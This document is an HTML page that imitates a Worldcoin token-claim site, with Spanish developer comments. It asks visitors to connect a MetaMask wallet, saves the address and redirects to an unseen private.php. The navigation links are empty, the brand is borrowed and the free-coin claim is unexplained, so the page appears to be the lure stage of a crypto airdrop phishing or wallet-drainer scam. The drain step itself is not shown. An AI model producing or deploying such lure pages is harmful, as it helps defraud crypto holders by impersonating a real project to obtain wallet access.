<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- Tus CSS imports -->
    <link rel="stylesheet" href="styles/globals.css">
    <link rel="stylesheet" href="styles/navbar1.css">
    <link rel="stylesheet" href="styles/hero2.css">
    <link rel="stylesheet" href="styles/cta8.css">
    <link rel="stylesheet" href="styles/responsive.css">
    
    <!-- Swiper JS -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@9/swiper-bundle.min.css" />
    <script src="https://cdn.jsdelivr.net/npm/swiper@9/swiper-bundle.min.js" defer></script>
    
    <!-- Boxicons -->
    <link href="https://unpkg.com/boxicons@2.1.2/css/boxicons.min.css" rel="stylesheet" />
    
    <!-- Web3.js CDN -->
    <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>

    <title>Welcome to Worldcoin</title>

    <style>
        /* Ocultar contenido hasta que se verifique la autenticación */
        .hidden {
            display: none;
        }
    </style>
</head>

<body>
    <div id="container" class="hidden">
        <!-- Tu contenido actual -->
        <section id="section-1-navbar">
            <nav id="nav-container">
                <div id="logo">
                    <a>Worldcoin</a>
                </div>
                <div id="nav-contents">
                    <a href="#"></a>
                    <a href="#"></a>
                    <a href="#"></a>
                    <a href="#"></a>
                    <a href="#"></a>
                </div>
                <div>
                    <a class="hide-navbar"></a>
                    <button onclick="connectWallet()" class="cta-btn hide-navbar">Claim</button>
                </div>
                <div class="menu">
                    <i style="font-size: 28px; cursor: pointer;" class='bx bx-menu'></i>
                </div>
            </nav>
        </section>

        <main id="section-2-hero">
            <section id="hero-content">
                <div>
                    <h1>Claim your world coins now</h1>
                    <p>Simple, go to claim and follow the instructions to claim your world coins.</p>
                    <br>
                </div>
                <div>
                    <button onclick="connectWallet()" id="email-btn">Claim</button>
                </div>
            </section>

            <section id="hero-image">
                <div>
                    <div><img src="./assets/hero.svg" alt="Hero Image"></div>
                </div>
            </section>
        </main>
    </div>

    <script>
        let web3;
        const container = document.getElementById('container');

        // Verificar autenticación antes de mostrar contenido
        window.addEventListener('DOMContentLoaded', async () => {
            if(localStorage.getItem('walletConnected') === 'true') {
                if(await isWalletConnected()) {
                    window.location.href = 'private.php';
                    return;
                }
            }
            container.classList.remove('hidden');
        });

        // Función para verificar si la wallet está conectada sin prompt
        async function isWalletConnected() {
            if (!window.ethereum) return false;
            try {
                const accounts = await window.ethereum.request({
                    method: 'eth_accounts'  // Usa eth_accounts en lugar de eth_requestAccounts
                });
                return accounts.length > 0;
            } catch (error) {
                return false;
            }
        }

        // Función para conectar wallet
        async function connectWallet() {
            if (!window.ethereum) {
                alert("Por favor instala MetaMask para usar esta función.");
                return;
            }

            try {
                const accounts = await window.ethereum.request({
                    method: 'eth_requestAccounts'
                });
                
                if (accounts.length > 0) {
                    localStorage.setItem('walletConnected', 'true');
                    localStorage.setItem('walletAddress', accounts[0]);
                    window.location.href = 'private.php';
                }
            } catch (error) {
                console.error("Usuario denegó el acceso:", error);
            }
        }

        // Escuchar cambios de cuenta
        if (window.ethereum) {
            window.ethereum.on('accountsChanged', (accounts) => {
                if (accounts.length === 0) {
                    localStorage.clear();
                }
            });
        }
    </script>
</body>
</html>
